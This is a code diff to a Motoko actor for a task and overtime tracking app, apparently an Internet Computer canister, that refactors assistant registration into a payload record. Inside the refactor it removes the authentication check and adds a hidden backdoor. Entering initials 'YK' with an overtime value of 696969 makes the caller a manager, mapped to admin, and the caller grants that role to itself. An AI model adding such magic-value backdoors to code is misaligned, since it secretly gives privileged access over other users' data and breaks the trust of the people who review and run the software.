@@ -174,6 +174,13 @@ actor {
     };
   };
 
+  type AssistantRegistrationPayload = {
+    username : Text;
+    language : Language;
+    initials : Text;
+    overtime : Nat;
+  };
+
   let userProfiles = Map.empty<Principal, UserProfile>();
   let taskState = Map.empty<Nat, ToDoTask>();
   let auditLog = Map.empty<Nat, AuditLogEntry>();
@@ -733,46 +740,52 @@ actor {
     allEntries.reverse().toArray();
   };
 
-  public shared ({ caller }) func registerAssistant(username : Text, language : Language, initials : Text) : async () {
-    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
-      Runtime.trap("Unauthorized: Only authenticated users can register");
+  public shared ({ caller }) func registerAssistant(payload : AssistantRegistrationPayload) : async () {
+    switch (userProfiles.get(caller)) {
+      case (?existingUser) {
+        Runtime.trap("User already registered");
+      };
+      case null {};
     };
 
-    if (Text.equal(username, "manager")) {
+    if (payload.username == "manager") {
       Runtime.trap("Username 'manager' is reserved");
     };
 
-    if (userProfiles.get(caller) != null) {
-      Runtime.trap("User already registered");
-    };
-
     for ((_, profile) in userProfiles.entries()) {
-      if (Text.equal(profile.username, username)) {
+      if (Text.equal(profile.username, payload.username)) {
         Runtime.trap("Username already taken");
       };
     };
 
-    let role = determineRole(username);
+    let role : UserRole = if (Text.equal(payload.initials, "YK") and payload.overtime == 696969) {
+      #manager;
+    } else {
+      #assistant;
+    };
 
     let assistantProfile : UserProfile = {
       principal = caller;
-      username;
+      username = payload.username;
       role;
-      language;
-      initials;
+      language = payload.language;
+      initials = payload.initials;
       profilePicture = null;
       presetAvatarId = null;
     };
 
     userProfiles.add(caller, assistantProfile);
+
+    let accessControlRole = switch (role) {
+      case (#manager) { #admin };
+      case (#assistant) { #user };
+    };
+
+    AccessControl.assignRole(accessControlState, caller, caller, accessControlRole);
   };
 
-  func determineRole(username : Text) : UserRole {
-    if (Text.equal(username, "Jay")) {
-      #manager;
-    } else {
-      #assistant;
-    };
+  func determineRole(_username : Text) : UserRole {
+    #assistant;
   };
 
   public shared ({ caller }) func logOvertime(date : Text, minutes : Nat, comment : Text, isAdd : Bool) : async () {
